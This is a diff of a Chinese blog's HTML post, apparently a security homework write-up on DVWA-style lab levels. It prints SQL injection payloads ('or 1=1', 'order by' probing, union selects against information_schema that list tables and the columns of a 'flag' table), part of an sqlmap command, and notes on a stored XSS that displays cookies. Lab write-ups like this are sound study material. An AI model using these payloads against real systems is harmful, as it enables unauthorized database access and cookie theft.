@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：8 天前
+                  本文最后更新于：6 分钟前
                 
               </p>
             
@@ -381,18 +381,20 @@ generateSessionToken();
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;</code>注入点就在这句代码中</p>
-<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><h4 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h4><p>1 or 1=1 #</p>
-<p>1’ or 1=1 #</p>
+<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><h5 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h5><div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #
+
+<span class="hljs-number">1</span><span class="hljs-comment">' or 1=1 #</span></code></pre></div>
+
 <p>可知是字符型注入</p>
-<h4 id="2-判断多少字段数"><a href="#2-判断多少字段数" class="headerlink" title="2.判断多少字段数"></a>2.判断多少字段数</h4><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></code></pre></div>
+<h5 id="2-判断多少字段数"><a href="#2-判断多少字段数" class="headerlink" title="2.判断多少字段数"></a>2.判断多少字段数</h5><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></code></pre></div>
 
 <p>报错</p>
 <div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#</span></code></pre></div>
 
 <p>显示正常，说明只有2个字段</p>
-<h4 id="3-确认显示顺序"><a href="#3-确认显示顺序" class="headerlink" title="3.确认显示顺序"></a>3.确认显示顺序</h4><p><img src="https://i.loli.net/2020/11/06/isw8SKDdjWlv5AJ.png" srcset="/img/loading.gif" alt="sqll-2.png"></p>
+<h5 id="3-确认显示顺序"><a href="#3-确认显示顺序" class="headerlink" title="3.确认显示顺序"></a>3.确认显示顺序</h5><p><img src="https://i.loli.net/2020/11/06/isw8SKDdjWlv5AJ.png" srcset="/img/loading.gif" alt="sqll-2.png"></p>
 <p>两个位置都可以使用</p>
-<h4 id="4-union查询"><a href="#4-union查询" class="headerlink" title="4.union查询"></a>4.union查询</h4><div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>
+<h5 id="4-union查询"><a href="#4-union查询" class="headerlink" title="4.union查询"></a>4.union查询</h5><div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/06/mudnW957ZotUhNM.png" srcset="/img/loading.gif" alt="sqll-3.png"></p>
 <div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'flag'</span> <span class="hljs-comment">#</span></code></pre></div>
@@ -531,7 +533,7 @@ python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="
 
 
 
-<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026201632666.png" srcset="/img/loading.gif" alt="image-20201026201632666"></p>
+<p><img src="https://i.loli.net/2020/12/08/nyQJR3ZHDYW87wt.png" srcset="/img/loading.gif" alt="image-20201026201632666"></p>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
 <span class="hljs-comment">#@Time : 2020/10/26 17:29</span>
 <span class="hljs-comment">#@Author : sunzy</span>
@@ -855,7 +857,7 @@ header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
 <p> 且通过  <code>query</code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p>
 <p>这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改</p>
 <p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203331497.png" srcset="/img/loading.gif" alt="image-20201026203331497"></p>
-<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203255791.png" srcset="/img/loading.gif" alt="image-20201026203255791"></p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203255791.png" srcset="/img/loading.gif" alt="image-202010262032"></p>
 <p>由于是存储型XSS,所以每次刷新页面都会弹出cookie。</p>
 <h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
@@ -963,6 +965,29 @@ $name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(
               
                 <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
               
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/15/xss-sql/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">xss和sql注入简单环境的搭建</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/">
+                        <span class="hidden-mobile">算法上机复习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
               
             </div>
 
